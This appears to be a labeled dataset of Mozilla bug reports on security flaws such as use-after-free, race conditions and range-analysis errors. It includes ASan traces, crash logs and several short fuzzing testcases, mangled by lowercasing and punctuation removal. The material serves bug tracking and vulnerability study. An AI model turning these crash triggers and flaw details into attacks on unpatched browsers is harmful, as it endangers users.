workerprivate.cpp:1705 xul.dll runsyncloop workerprivate.cpp:3612 xul.dll loadallscripts scriptloader.cpp:717 xul.dll load scriptloader.cpp:945 xul.dll importscripts workerscope.cpp:419 mozjs.dll calljsnative jscntxtinlines.h:218 mozjs.dll invoke interpreter.cpp:489 mozjs.dll interpret interpreter.cpp:2484 mozjs.dll runscript interpreter.cpp:446 mozjs.dll executekernel interpreter.cpp:630 mozjs.dll execute interpreter.cpp:667 mozjs.dll evaluate jsapi.cpp:5156 marking s-s until we know otherwise	11
moz_crash when trying to transplant objects with same-compartment security wrappers see bug 921454 comment 5 i m going to use this bug to track the security issue here since this is what we ll end up landing on all branches and mark bug 921454 sec-other	11
nsprefetchnode use-after-free about a third of the time just starting firefox pointing at bugzilla and shutting it down triggers a use-after-free of an nsprefetchnode	11
heap-use-after-free in libxul.so presshell dispatchsynthmousemove found by the blackberry security automated analysis team s fuzzing framework alf 21242==error addresssanitizer heap-use-after-free on address at pc bp sp read of size 4 at thread t0 0 libxul.so presshell dispatchsynthmousemove mozilla widgetguievent bool line 75 of builds/slave/m-in-l64-asan-0000000000000000/build/layout/base/restylemanager.h 1 libxul.so presshell processsynthmousemoveevent bool line 5256 of builds/slave/m-in-l64-asan-0000000000000000/build/layout/base/nspresshell.cpp 2 libxul.so nsrefreshdriver tick long mozilla timestamp line 1074 of builds/slave/m-in-l64-asan-0000000000000000/build/layout/base/nsrefreshdriver.cpp 3 libxul.so mozilla refreshdrivertimer tick line 168 of builds/slave/m-in-l64-asan-0000000000000000/build/layout/base/nsrefreshdriver.cpp 4 libxul.so nstimerimpl fire line 546 of builds/slave/m-in-l64-asan-0000000000000000/build/xpcom/threads/nstimerimpl.cpp 5 libxul.so nstimerevent run line 630 of builds/slave/m-in-l64-asan-0000000000000000/build/xpcom/threads/nstimerimpl.cpp 6 libxul.so nsthread processnextevent bool bool line 622 of builds/slave/m-in-l64-asan-0000000000000000/build/xpcom/threads/nsthread.cpp 7 libxul.so ns_processnextevent nsithread bool line 251 of builds/slave/m-in-l64-asan-0000000000000000/build/xpcom/glue/nsthreadutils.cpp 8 libxul.so mozilla ipc messagepump run base messagepump delegate line 85 of builds/slave/m-in-l64-asan-0000000000000000/build/ipc/glue/messagepump.cpp 9 libxul.so messageloop run line 220 of builds/slave/m-in-l64-asan-0000000000000000/build/ipc/chromium/src/base/message_loop.cc 10 libxul.so nsbaseappshell run line 161 of builds/slave/m-in-l64-asan-0000000000000000/build/widget/xpwidgets/nsbaseappshell.cpp 11 libxul.so nsappstartup run line 268 of builds/slave/m-in-l64-asan-0000000000000000/build/toolkit/components/startup/nsappstartup.cpp 12 libxul.so xremain xre_mainrun line 3886 of builds/slave/m-in-l64-asan-0000000000000000/build/toolkit/xre/nsapprunner.cpp 13 libxul.so xremain xre_main int char nsxreappdata const line 3954 of builds/slave/m-in-l64-asan-0000000000000000/build/toolkit/xre/nsapprunner.cpp 14 libxul.so xre_main line 4156 of builds/slave/m-in-l64-asan-0000000000000000/build/toolkit/xre/nsapprunner.cpp 15 firefox main line 275 of builds/slave/m-in-l64-asan-0000000000000000/build/browser/app/nsbrowserapp.cpp 16 libc.so.6 libc_start_main line 226 of libc-start.c 17 firefox start is located 28 bytes inside of 760-byte region freed by thread t0 here 0 firefox free line 64 of builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc 1 libxul.so mozilla restylemanager release line 225 of dist/include/mozilla/mozalloc.h previously allocated by thread t0 here 0 firefox malloc line 74 of builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc 1 libmozalloc.so moz_xmalloc line 54 of builds/slave/m-in-l64-asan-0000000000000000/build/memory/mozalloc/mozalloc.cpp 2 libxul.so nsdocumentviewer initinternal nsiwidget nsisupports nsintrect const bool bool bool line 824 of builds/slave/m-in-l64-asan-0000000000000000/build/layout/base/nsdocumentviewer.cpp 3 libxul.so nsdocumentviewer init nsiwidget nsintrect const line 642 of builds/slave/m-in-l64-asan-0000000000000000/build/layout/base/nsdocumentviewer.cpp 4 libxul.so nsdocshell embed nsicontentviewer char const nsisupports line 6397 of builds/slave/m-in-l64-asan-0000000000000000/build/docshell/base/nsdocshell.cpp 5 libxul.so nsdocshell createcontentviewer char const nsirequest nsistreamlistener line 8173 of builds/slave/m-in-l64-asan-0000000000000000/build/docshell/base/nsdocshell.cpp 6 libxul.so nsdsuricontentlistener docontent char const bool nsirequest nsistreamlistener bool line 122 of builds/slave/m-in-l64-asan-0000000000000000/build/docshell/base/nsdsuricontentlistener.cpp 7 libxul.so nsdocumentopeninfo trycontentlistener nsiuricontentlistener nsichannel line 680 of builds/slave/m-in-l64-asan-0000000000000000/build/uriloader/base/nsuriloader.cpp 8 libxul.so nsdocumentopeninfo dispatchcontent nsirequest nsisupports line 382 of builds/slave/m-in-l64-asan-0000000000000000/build/uriloader/base/nsuriloader.cpp 9 libxul.so nsdocumentopeninfo onstartrequest nsirequest nsisupports line 258 of builds/slave/m-in-l64-asan-0000000000000000/build/uriloader/base/nsuriloader.cpp 10 libxul.so nsbasechannel onstartrequest nsirequest nsisupports line 718 of builds/slave/m-in-l64-asan-0000000000000000/build/netwerk/base/src/nsbasechannel.cpp shadow bytes around the buggy address 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa shadow byte legend one shadow byte represents 8 application bytes addressable 00 partially addressable 01 02 03 04 05 06 07 heap left redzone fa heap right redzone fb freed heap region fd stack left redzone f1 stack mid redzone f2 stack right redzone f3 stack partial redzone f4 stack after return f5 stack use after scope f8 global redzone f9 global init order f6 poisoned by user f7 asan internal fe 21242==aborting	11
heap-use-after-free in mozilla restylemanager gethovergeneration tested in os ubuntu 12.04 firefox debug asan-build from repro-file has two parts run.html opens repro.html in an iframe and reloads it with 400ms interval via onload-event to reproduce the issue open run.html with firefox and move mouse cursor into the area of the iframe on the page asan-report 15391==error addresssanitizer heap-use-after-free on address at pc bp sp read of size 4 at thread t0 0 in mozilla restylemanager gethovergeneration const builds/slave/m-cen-l64-asan-d-0000000000000/build/layout/base/restylemanager.h:75:0 1 in presshell dispatchsynthmousemove mozilla widgetguievent bool builds/slave/m-cen-l64-asan-d-0000000000000/build/layout/base/nspresshell.cpp:3416:0 2 in presshell processsynthmousemoveevent bool builds/slave/m-cen-l64-asan-d-0000000000000/build/layout/base/nspresshell.cpp:5256:0 3 in nsrefreshdriver tick long mozilla timestamp builds/slave/m-cen-l64-asan-d-0000000000000/build/layout/base/nsrefreshdriver.cpp:1074:0 4 in mozilla refreshdrivertimer tick builds/slave/m-cen-l64-asan-d-0000000000000/build/layout/base/nsrefreshdriver.cpp:160:0 5 in nstimerimpl fire builds/slave/m-cen-l64-asan-d-0000000000000/build/xpcom/threads/nstimerimpl.cpp:546:0 6 in nstimerevent run builds/slave/m-cen-l64-asan-d-0000000000000/build/xpcom/threads/nstimerimpl.cpp:630:0 7 in nsthread processnextevent bool bool builds/slave/m-cen-l64-asan-d-0000000000000/build/xpcom/threads/nsthread.cpp:622:0 8 in ns_processnextevent nsithread bool builds/slave/m-cen-l64-asan-d-0000000000000/build/xpcom/glue/nsthreadutils.cpp:251:0 9 in mozilla ipc messagepump run base messagepump delegate builds/slave/m-cen-l64-asan-d-0000000000000/build/ipc/glue/messagepump.cpp:85:0 10 in messageloop runinternal builds/slave/m-cen-l64-asan-d-0000000000000/build/ipc/chromium/src/base/message_loop.cc:220:0 11 in messageloop run builds/slave/m-cen-l64-asan-d-0000000000000/build/ipc/chromium/src/base/message_loop.cc:187:0 12 in nsbaseappshell run builds/slave/m-cen-l64-asan-d-0000000000000/build/widget/xpwidgets/nsbaseappshell.cpp:161:0 13 in nsappstartup run builds/slave/m-cen-l64-asan-d-0000000000000/build/toolkit/components/startup/nsappstartup.cpp:268:0 14 in xremain xre_mainrun builds/slave/m-cen-l64-asan-d-0000000000000/build/toolkit/xre/nsapprunner.cpp:3976:0 15 in xremain xre_main int char nsxreappdata const builds/slave/m-cen-l64-asan-d-0000000000000/build/toolkit/xre/nsapprunner.cpp:4044:0 16 in xre_main builds/slave/m-cen-l64-asan-d-0000000000000/build/toolkit/xre/nsapprunner.cpp:4246:0 17 in do_main int char nsifile builds/slave/m-cen-l64-asan-d-0000000000000/build/browser/app/nsbrowserapp.cpp:275:0 18 in main builds/slave/m-cen-l64-asan-d-0000000000000/build/browser/app/nsbrowserapp.cpp:635:0 19 in libc_start_main build/buildd/eglibc-2.15/csu/libc-start.c:226:0 20 in start 0 is located 28 bytes inside of 760-byte region freed by thread t0 here 0 in interceptor_free asan_rtl_:0 1 in operator delete void builds/slave/m-cen-l64-asan-d-0000000000000/build/obj-firefox/layout/base dist/include/mozilla/mozalloc.h:225:0 2 in mozilla restylemanager release builds/slave/m-cen-l64-asan-d-0000000000000/build/layout/base/restylemanager.h:38:0 3 in nsrefptr mozilla restylemanager operator mozilla restylemanager builds/slave/m-cen-l64-asan-d-0000000000000/build/obj-firefox/layout/base dist/include/nsautoptr.h:943:0 4 in nsprescontext setshell nsipresshell builds/slave/m-cen-l64-asan-d-0000000000000/build/layout/base/nsprescontext.cpp:1109:0 5 in presshell destroy builds/slave/m-cen-l64-asan-d-0000000000000/build/layout/base/nspresshell.cpp:1058:0 6 in nsdocumentviewer destroypresshell builds/slave/m-cen-l64-asan-d-0000000000000/build/layout/base/nsdocumentviewer.cpp:4334:0 7 in nsdocumentviewer hide builds/slave/m-cen-l64-asan-d-0000000000000/build/layout/base/nsdocumentviewer.cpp:2023:0 8 in nsdocshell setvisibility bool builds/slave/m-cen-l64-asan-d-0000000000000/build/docshell/base/nsdocshell.cpp:5523:0 9 in non-virtual thunk to nsdocshell setvisibility bool builds/slave/m-cen-l64-asan-d-0000000000000/build/docshell/base/nsdocshell.cpp:5527:0 10 in nsframeloader hide builds/slave/m-cen-l64-asan-d-0000000000000/build/content/base/src/nsframeloader.cpp:997:0 11 in nshideviewer run builds/slave/m-cen-l64-asan-d-0000000000000/build/layout/generic/nssubdocumentframe.cpp:780:0 12 in nscontentutils removescriptblocker builds/slave/m-cen-l64-asan-d-0000000000000/build/content/base/src/nscontentutils.cpp:4786:0 13 in nsdocument endupdate unsigned int builds/slave/m-cen-l64-asan-d-0000000000000/build/content/base/src/nsdocument.cpp:4471:0 14 in nshtmldocument endupdate unsigned int builds/slave/m-cen-l64-asan-d-0000000000000/build/content/html/document/src/nshtmldocument.cpp:2427:0 15 in mozautodocupdate mozautodocupdate builds/slave/m-cen-l64-asan-d-0000000000000/build/content/base/src/mozautodocupdate.h:38:0 16 in nsinode doremovechildat unsigned int bool nsicontent nsattrandchildarray builds/slave/m-cen-l64-asan-d-0000000000000/build/content/base/src/nsinode.cpp:1522:0 17 in mozilla dom fragmentorelement removechildat unsigned int bool builds/slave/m-cen-l64-asan-d-0000000000000/build/content/base/src/fragmentorelement.cpp:963:0 18 in nsinode removechild nsinode mozilla errorresult builds/slave/m-cen-l64-asan-d-0000000000000/build/content/base/src/nsinode.cpp:458:0 19 in mozilla dom nodebinding removechild jscontext js handle jsobject nsinode jsjitmethodcallargs const builds/slave/m-cen-l64-asan-d-0000000000000/build/obj-firefox/dom/bindings/./nodebinding.cpp:628:0 20 in mozilla dom nodebinding genericmethod jscontext unsigned int js value builds/slave/m-cen-l64-asan-d-0000000000000/build/obj-firefox/dom/bindings/./nodebinding.cpp:1231:0 21 in js calljsnative jscontext bool jscontext unsigned int js value js callargs const builds/slave/m-cen-l64-asan-d-0000000000000/build/js/src/jscntxtinlines.h:220:0 22 in js invoke jscontext js callargs js maybeconstruct builds/slave/m-cen-l64-asan-d-0000000000000/build/js/src/vm/interpreter.cpp:455:16 23 in interpret jscontext js runstate builds/slave/m-cen-l64-asan-d-0000000000000/build/js/src/vm/interpreter.cpp:2499:0 24 in js runscript jscontext js runstate builds/slave/m-cen-l64-asan-d-0000000000000/build/js/src/vm/interpreter.cpp:419:0 25 in js invoke jscontext js callargs js maybeconstruct builds/slave/m-cen-l64-asan-d-0000000000000/build/js/src/vm/interpreter.cpp:481:0 26 in js invoke jscontext js value const js value const unsigned int js value js mutablehandle js value builds/slave/m-cen-l64-asan-d-0000000000000/build/js/src/vm/interpreter.cpp:512:0 27 in js directproxyhandler call jscontext js handle jsobject js callargs const builds/slave/m-cen-l64-asan-d-0000000000000/build/js/src/jsproxy.cpp:454:0 28 in js crosscompartmentwrapper call jscontext js handle jsobject js callargs const builds/slave/m-cen-l64-asan-d-0000000000000/build/js/src/jswrapper.cpp:454:0 29 in js proxy call jscontext js handle jsobject js callargs const builds/slave/m-cen-l64-asan-d-0000000000000/build/js/src/jsproxy.cpp:2643:0 30 in proxy_call jscontext unsigned int js value builds/slave/m-cen-l64-asan-d-0000000000000/build/js/src/jsproxy.cpp:3037:0 previously allocated by thread t0 here 0 in malloc asan_rtl_:0 1 in moz_xmalloc builds/slave/m-cen-l64-asan-d-0000000000000/build/memory/mozalloc/mozalloc.cpp:54:0 2 in operator new unsigned long builds/slave/m-cen-l64-asan-d-0000000000000/build/obj-firefox/layout/base dist/include/mozilla/mozalloc.h:201:0 3 in nsprescontext init nsdevicecontext builds/slave/m-cen-l64-asan-d-0000000000000/build/layout/base/nsprescontext.cpp:931:0 4 in nsdocumentviewer show builds/slave/m-cen-l64-asan-d-0000000000000/build/layout/base/nsdocumentviewer.cpp:1946:0 5 in nsdocshell setvisibility bool builds/slave/m-cen-l64-asan-d-0000000000000/build/docshell/base/nsdocshell.cpp:5523:0 6 in non-virtual thunk to nsdocshell setvisibility bool builds/slave/m-cen-l64-asan-d-0000000000000/build/docshell/base/nsdocshell.cpp:5527:0 7 in nsframeloader show int int int int nssubdocumentframe builds/slave/m-cen-l64-asan-d-0000000000000/build/content/base/src/nsframeloader.cpp:846:0 8 in nssubdocumentframe showviewer builds/slave/m-cen-l64-asan-d-0000000000000/build/layout/generic/nssubdocumentframe.cpp:188:27 9 in asyncframeinit run builds/slave/m-cen-l64-asan-d-0000000000000/build/layout/generic/nssubdocumentframe.cpp:82:0 10 in nscontentutils removescriptblocker builds/slave/m-cen-l64-asan-d-0000000000000/build/content/base/src/nscontentutils.cpp:4786:0 11 in nsautoscriptblocker nsautoscriptblocker builds/slave/m-cen-l64-asan-d-0000000000000/build/obj-firefox/toolkit/components/places dist/include/nscontentutils.h:2200:0 12 in presshell flushpendingnotifications mozilla changestoflush builds/slave/m-cen-l64-asan-d-0000000000000/build/layout/base/nspresshell.cpp:3831:0 13 in nsrefreshdriver tick long mozilla timestamp builds/slave/m-cen-l64-asan-d-0000000000000/build/layout/base/nsrefreshdriver.cpp:1139:0 14 in mozilla refreshdrivertimer tick builds/slave/m-cen-l64-asan-d-0000000000000/build/layout/base/nsrefreshdriver.cpp:160:0 15 in nstimerimpl fire builds/slave/m-cen-l64-asan-d-0000000000000/build/xpcom/threads/nstimerimpl.cpp:546:0 16 in nstimerevent run builds/slave/m-cen-l64-asan-d-0000000000000/build/xpcom/threads/nstimerimpl.cpp:630:0 17 in nsthread processnextevent bool bool builds/slave/m-cen-l64-asan-d-0000000000000/build/xpcom/threads/nsthread.cpp:622:0 18 in ns_processnextevent nsithread bool builds/slave/m-cen-l64-asan-d-0000000000000/build/xpcom/glue/nsthreadutils.cpp:251:0 19 in mozilla ipc messagepump run base messagepump delegate builds/slave/m-cen-l64-asan-d-0000000000000/build/ipc/glue/messagepump.cpp:85:0 20 in messageloop runinternal builds/slave/m-cen-l64-asan-d-0000000000000/build/ipc/chromium/src/base/message_loop.cc:220:0 21 in messageloop run builds/slave/m-cen-l64-asan-d-0000000000000/build/ipc/chromium/src/base/message_loop.cc:187:0 22 in nsbaseappshell run builds/slave/m-cen-l64-asan-d-0000000000000/build/widget/xpwidgets/nsbaseappshell.cpp:161:0 23 in nsappstartup run builds/slave/m-cen-l64-asan-d-0000000000000/build/toolkit/components/startup/nsappstartup.cpp:268:0 24 in xremain xre_mainrun builds/slave/m-cen-l64-asan-d-0000000000000/build/toolkit/xre/nsapprunner.cpp:3976:0 25 in xremain xre_main int char nsxreappdata const builds/slave/m-cen-l64-asan-d-0000000000000/build/toolkit/xre/nsapprunner.cpp:4044:0 26 in xre_main builds/slave/m-cen-l64-asan-d-0000000000000/build/toolkit/xre/nsapprunner.cpp:4246:0 27 in do_main int char nsifile builds/slave/m-cen-l64-asan-d-0000000000000/build/browser/app/nsbrowserapp.cpp:275:0 28 in main builds/slave/m-cen-l64-asan-d-0000000000000/build/browser/app/nsbrowserapp.cpp:635:0 29 in libc_start_main build/buildd/eglibc-2.15/csu/libc-start.c:226:0 shadow bytes around the buggy address 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa shadow byte legend one shadow byte represents 8 application bytes addressable 00 partially addressable 01 02 03 04 05 06 07 heap left redzone fa heap right redzone fb freed heap region fd stack left redzone f1 stack mid redzone f2 stack right redzone f3 stack partial redzone f4 stack after return f5 stack use after scope f8 global redzone f9 global init order f6 poisoned by user f7 asan internal fe 15391==aborting in addition to asan-output the debug-build also throws few assertions but i m not sure if those are directly related assertion non-root reflow roots must not have scrollable overflow target rootframe desiredsize.scrollableoverflow isequaledges boundsrelativetotarget file builds/slave/m-cen-l64-asan-d-0000000000000/build/layout/base/nspresshell.cpp line 7937 assertion should n't have unconstrained stuff here thanks to computeautosize ns_intrinsicsize areflowstate.computedheight file builds/slave/m-cen-l64-asan-d-0000000000000/build/layout/generic/nsleafframe.cpp line 75	11
assertion failure barrier verifier unmarked edge baseline-monitor-typeobject at gc/verifier.cpp:569 the following testcase asserts on mozilla-central revision e4cd2242cc7d threadsafe build run with fuzzing-safe ion-eager thread-count=2 ion-parallel-compile=on var lfcode new array lfcode.push lfcode.push 4 lfcode.push gczeal 4 function callback callback setobjectmetadatacallback callback while true var file lfcode.shift if file undefined break loadfile file function loadfile lfvarx try if lfvarx.substr 3 js lfvarx.length 1 switch lfruntypeid case 4 eval function lfvarx break else if isnan lfvarx lfruntypeid parseint lfvarx catch lfvare if lfvare instanceof syntaxerror	11
uaf in signaling_unittests no description provided	11
intermittent test_sanitysimpletest.html application terminated with exit code 11 application crashed pk11_importcert i m afraid this might be a regression from yesterday s nss update kai can you please take a look ubuntu vm 12.04 mozilla-aurora debug test mochitest-1 on 2013-11-08 19:01:10 pst for push 51f5ae29c5de slave tst-linux32-ec2-101 19:05:31 info 161 info test-start tests/harness_sanity/test_sanitysimpletest.html 19:05:32 info pkix_cachecert_add pkix_pl_hashtable_add for certs skipped entry existed 19:05:32 info pkix_cachecert_add pkix_pl_hashtable_add for certs skipped entry existed 19:05:32 info domwindow 38 serial 45 outer 19:05:32 info 162 info test-info tests/harness_sanity/test_sanitysimpletest.html profile simpletestloadtime 32 19:05:32 info 163 info test-info tests/harness_sanity/test_sanitysimpletest.html logging some info 19:05:32 info 164 info test-pass tests/harness_sanity/test_sanitysimpletest.html test ok this should be true 19:05:32 info 165 info test-pass tests/harness_sanity/test_sanitysimpletest.html is test failed 19:05:32 info 166 info test-pass tests/harness_sanity/test_sanitysimpletest.html isnot test failed 19:05:32 info 167 info test-known-fail tests/harness_sanity/test_sanitysimpletest.html test todo todo test should not pass 19:05:32 info 168 info test-known-fail tests/harness_sanity/test_sanitysimpletest.html test todo_is got false expected true 19:05:32 info 169 info test-known-fail tests/harness_sanity/test_sanitysimpletest.html test todo_isnot did n't expect true but got it 19:05:32 info 170 info test-pass tests/harness_sanity/test_sanitysimpletest.html testpluginisoop should be bool 19:05:32 info 171 info test-pass tests/harness_sanity/test_sanitysimpletest.html clipboard has the correct value 19:05:32 info 172 info test-pass tests/harness_sanity/test_sanitysimpletest.html waitforclipboard should work 19:05:32 info 173 info test-pass tests/harness_sanity/test_sanitysimpletest.html createel did not create element as expected 19:05:32 info 174 info test-pass tests/harness_sanity/test_sanitysimpletest.html helper did not get element as expected 19:05:32 info 175 info test-pass tests/harness_sanity/test_sanitysimpletest.html computedstyle did not get right display value 19:05:32 info 176 info test-info tests/harness_sanity/test_sanitysimpletest.html profile simpletestruntime 117 19:05:32 info 177 info test-pass tests/harness_sanity/test_sanitysimpletest.html expected uncaught exception uncaught exception i am an uncaught exception at 0 19:05:32 info javascript error line 0 uncaught exception i am an uncaught exception 19:05:33 warning test-unexpected-fail tests/harness_sanity/test_sanitysimpletest.html application terminated with exit code 11 19:05:33 info info runtests.py application ran for 0:00:26.610075 19:05:33 info info zombiecheck reading pid log tmp/tmphm6codpidlog 19:05:47 warning process-crash tests/harness_sanity/test_sanitysimpletest.html application crashed pk11_importcert 19:05:47 info crash dump filename tmp/tmpsh6iya/minidumps/4c711747-7f3f-8543-3baf75be-34474794.dmp 19:05:47 info operating system linux 19:05:47 info 0.0.0 linux 3.2.0-23-generic-pae 36-ubuntu smp tue apr 10 22:19:09 utc 2012 i686 19:05:47 info cpu x86 19:05:47 info genuineintel family 6 model 26 stepping 5 19:05:47 info 1 cpu 19:05:47 info crash reason sigsegv 19:05:47 info crash address 19:05:47 info thread 31 crashed 19:05:47 info 0 libnss3.so pk11_importcert pk11cert.c:51f5ae29c5de 972 19:05:47 info eip esp ebp ebx 19:05:47 info esi edi eax ecx 19:05:47 info edx efl 19:05:47 info found by given as instruction pointer in context 19:05:47 info 1 libxul.so mozilla psm authcertificate sslservercertverification.cpp:51f5ae29c5de 960 19:05:47 info eip esp ebp ebx 19:05:47 info esi edi 19:05:47 info found by call frame info 19:05:47 info 2 libxul.so mozilla psm sslservercertverificationjob run sslservercertverification.cpp:51f5ae29c5de 1058 19:05:47 info eip esp ebp ebx 19:05:47 info esi edi 19:05:47 info found by call frame info 19:05:47 info 3 libxul.so nsthreadpool run nsthreadpool.cpp:51f5ae29c5de 204 19:05:47 info eip esp ebp ebx 19:05:47 info esi edi 19:05:47 info found by call frame info 19:05:47 info 4 libxul.so nsthread processnextevent bool bool nsthread.cpp:51f5ae29c5de 622 19:05:47 info eip esp ebp ebx 19:05:47 info esi edi 19:05:47 info found by call frame info 19:05:47 info 5 libxul.so ns_processnextevent nsithread bool nsthreadutils.cpp:51f5ae29c5de 251 19:05:47 info eip esp ebp ebx 19:05:47 info esi edi 19:05:47 info found by call frame info 19:05:47 info 6 libxul.so nsthread threadfunc void nsthread.cpp:51f5ae29c5de 250 19:05:47 info eip esp ebp ebx 19:05:47 info esi edi 19:05:47 info found by call frame info	11
lifoalloc missing overflow checks js/src/ds/lifoalloc.h contains generic array allocation code which does sizeof t count without checking for overflow i have not audited the codebase to determine if this is exploitable i was just trying to figure out the intended difference between newarray and newarrayuninitialized and it s still not clear and noticed this while i was there	11
dangerous crash on heap possibly near js jit charcodeat the following testcase crashes on mozilla-central revision 581d180a37f3 run with fuzzing-safe while true foo 0 function foo s s.charat 0 number s.charat 2147483648	11
mediamanager s js objects released on non-main threads this bug was initially created as a clone of bug 929029 from bug 929029 comment 57 some mediamanager s js objects seems to be released on non main thread	11
use-after-free or worse in valuenumberer lookupvalue in valuenumberer lookupvalue we acquire a pointer p into the hashtable then breakclass this may and does in practice modify the table then return p value if breakclass s modifications cause a table resize p value will return a random table entry freed garbage or even a different threads memory this could cause an untold litany of immediate or subtle downstream damage but is probably quite hard to exploit in practice i think we want the pre-broken instruction id here instead but i m not familiar enough with our implementation of the algorithm to be 100 sure	11
crash nsuserfontset checkfontload with user_pref security.fileuri.strict_origin_policy false about half the time the testcase crashes nsuserfontset checkfontload	11
assertion failure double input should be equal or higher than lowerbound at jit/ionmacroassembler.cpp gcslice 5 function f y return 8 math.abs math.tan y y f 0 f 0 asserts js debug shell on m-c changeset c049cb230d77 with ion-eager ion-check-range-analysis at assertion failure double input should be equal or higher than lowerbound at jit/ionmacroassembler.cpp s-s because range analysis bugs can sometimes be s-s so locking pending analysis my configure flags are cc clang qunused-arguments ar=ar cxx clang qunused-arguments sh configure target=x86_64-apple-darwin12.5.0 enable-optimize enable-debug enable-profiling enable-gczeal enable-debug-symbols enable-methodjit enable-type-inference disable-tests with-ccache enable-threadsafe other nspr options tinderbox build bisection results last good changeset has timestamp 20131209104147 and the hash a79294ed7ebe first bad changeset has timestamp 20131209134603 and the hash de6ebd46e7d0 likely regression window guessing related to bug 943303 so setting needinfo from sunfish	11
assertion failure obj at dist/include/js/value.h:527 or crash on heap with gcpreservecode the following testcase asserts on mozilla-central revision b980c2dee2e7 run with fuzzing-safe ion-eager gcpreservecode function asserteq setter function raisesexception exception try catch actual if typeof a object for var prop in a function build_getter i var x 1 return function f return x function test var n internalconst incremental_mark_stack_base_capacity 2 var o var descriptor enumerable true for var i 0 i n i descriptor.get build_getter i object.defineproperty o i descriptor for var i 0 i raisesexception i asserteq o i 0 i evaluate test	11
assertion failure mir instruction returned value with unexpected type at jit/ionmacroassembler.cpp:1223 the following testcase asserts on mozilla-central revision cd3e9359fd64 run with fuzzing-safe ion-eager function test var arr new uint32array 100 arr 50 for var i=0 i 200 i res arr i this test	11
newsessionticket handshake message in a resumption handshake replaces cached session s ticket before handshake is finished see section-3.3 the client must not treat the ticket as valid until it has verified the server s finished message this bug affects the case illustrated in figure 2 of rfc 5077 message flow for abbreviated handshake using new session ticket where a newsessionticket message is sent during a session resumption replacing the session ticket for a session already stored in the cache that session may already be in use by other connections i am not sure if or how this bug could be exploited however i am not convinced it is unexploitable either so i am hiding this bug for now i suspect that on its own it is somewhat benign and may just result in dos or poor performance however i think we should investigate further whether this could be used in conjunction with other attacks either against us the client or against servers particularly maybe incomplete verification of the ticket on the part of the server could result in cve-2009-3555-like attacks when combined with this similarly if there were some kind of session confusion issue on the client side then this bug might make those issues worse the session ticket is unusual in that it is an updatable part of a session where most session data is not updatable if we ever expose the session ticket to applications so that applications can associate the exact ticket used with a connection actually a particular handshake on the connection then would need to maintain an independent copy of the ticket data in ss ssl3.hs at all times instead of moving it from ss ssl3.hs to the sid like this patch does more alarmingly there appear to be race conditions toctou potentially use-after-free to lack of locking around reads and updates of the session ticket within the sid i am investigating this and will file another bug to fix that	11
toctou potential use-after-free in libssl s session ticket processing due to lack of lock protecting the sessionticket field of the sid this bug was initially created as a clone of bug 930857 it appear there are race conditions toctou potentially use-after-free to lack of locking around reads and updates of the sessionticket field of sslsessionidstr for example these races can happen when thread a is trying to resume a session concurrently with thread b that has already started resuming session that same session and where thread b has received a newsessionticket extension that will cause it to update the sessionticket field of the sid that thread a is trying to read this may cause a use-after-free when ssl3_setsidsessionticket calls secitem_freeitem to free the session ticket data when ssl3_sendsessionticketxtn is trying to read it there are probably other similar problems we need locks to protect the sessionticket field when we read it in ssl3_sendclienthello/ssl3_sendsessionticketxtn and ssl3_handleserverhello and and cachesid and when we change update it in ssl3_setsidsessionticket at least additionally we may need to be careful about handling the case where the session ticket is modified by ssl3_setsidsessionticket between execution of the above functions i.e we probably ca n't just acquire/release a mutex around the access of the sessionticket field independently in each of the aforementioned functions instead we need to save some state between calls to those functions in the case of the gap between ssl3_sendclienthello/ssl3_sendsessionticketxtn we may be able to get away with just storing a prbool sendsessionticket in ss ssl3.hs instead of copying the entire ticket i suspect that the type of problem described in this paragraph may occur even for single-threaded clients btw if we ever expose the session ticket to applications so that applications can associate the exact ticket used with a connection actually a particular handshake on the connection then would need to maintain an independent copy of the ticket data in ss ssl3.hs at all times instead of moving it from ss ssl3.hs to the sid like this patch does	11
assertion failure ns_ismainthread and crash mozilla image decoder allocateframe load the attached testcase and click the ok button for every two popup boxes then wait a few seconds assertion failure ns_ismainthread at users/cdiehl/dev/repos/mozilla/mozilla-inbound/image/src/decoder.cpp:197 tested with	11
make sure to call holdjsobjects when setting idbfactory mowningobject while testing a patch for bug 958315 it revealed an sg crit bug in idb we do n't always end up tracing mowningobject because of the missing holdjsobjects seems to be a regression from bug 772700 added holdjsobjects call to another create method	11
range analysis for phi nodes ignores osr values range analysis for phi nodes ignores osr value operands see mphi computerange in the testcase in bug 960071 the loop phi has a zero constant and an osr value range analysis ignores the osr value and returns 0,0 at runtime the osr edge is executed the osr value is 1 the phi node has value 1 and the range check fails ignoring osr values seems wrong in view of this testcase it s been this way since af9e58e86102 bug 765119 this issue was hidden in part by a bug in ion-check-range-analysis which caused it to neglect to check ranges on phi nodes i ve filed bug 960143 for this	11
faulty crash use-after-free of mcurrentcompositetask in compositorparent recvflushrendering found by christoph diehl s faulty fuzzer see bug 777067	11
